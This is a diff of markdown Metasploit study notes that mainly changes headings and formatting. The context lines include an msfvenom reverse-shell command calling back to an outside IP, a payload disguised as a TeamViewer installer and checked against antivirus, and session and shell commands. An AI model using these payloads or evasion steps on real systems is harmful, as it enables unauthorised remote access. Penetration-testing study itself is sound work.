@@ -86,9 +86,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f exe > Bonus
 
 ## Meterpreter
 
-`The Meterpreter` payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques.
+<mark style="color:blue;">**`The Meterpreter`**</mark> payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques.
 
-## Encoder
+### Encoder
 
 * **Generating Payload - With Encoding**
 
@@ -108,7 +108,7 @@ msf6 exploit(windows/smb/goose) > show encoders
 msf-virustotal -k <API key> -f TeamViewerInstall.exe
 ```
 
-## Sessions
+### Sessions
 
 * **Listing Active Sessions**
 
@@ -122,7 +122,13 @@ msf6 exploit(windows/smb/goose) > sessions
 msf6 exploit(windows/smb/goose) > sessions -i 1
 ```
 
-* **Backgrounding session**
+* **Getting shell**
+
+```bash
+msf6 exploit(windows/smb/goose) > shell
+```
+
+* **Background session**
 
 ```bash
 meterpreter > background
